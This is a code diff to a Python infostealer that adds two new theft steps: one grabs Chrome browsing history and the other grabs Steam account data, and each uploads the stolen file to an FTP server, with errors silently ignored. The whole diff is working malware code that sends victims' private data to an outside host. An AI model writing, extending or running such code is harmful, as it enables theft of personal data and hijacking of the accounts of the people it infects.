@@ -2,6 +2,7 @@ import stealers
 import config
 from os import path
 from ftplib import FTP
+import traceback
 
 def _storbinary(self, *args, count = 50, **kwargs):
 	if count < 1:
@@ -43,6 +44,17 @@ def main():
 	except:
 		pass
 
+	try:
+		chrome_history = stealers.chrome.history.steal()
+		ftp.storbinary(f"STOR {path.basename('chrome.history.sqlite')}", chrome_history, config.BUFFER_SIZE)
+	except:
+		pass
+
+	try:
+		steam = stealers.steam.steal()
+		ftp.storbinary(f"STOR {path.basename('steam.zip')}", steam, config.BUFFER_SIZE)
+	except:
+		pass
 
 if __name__ == "__main__":
 	main()
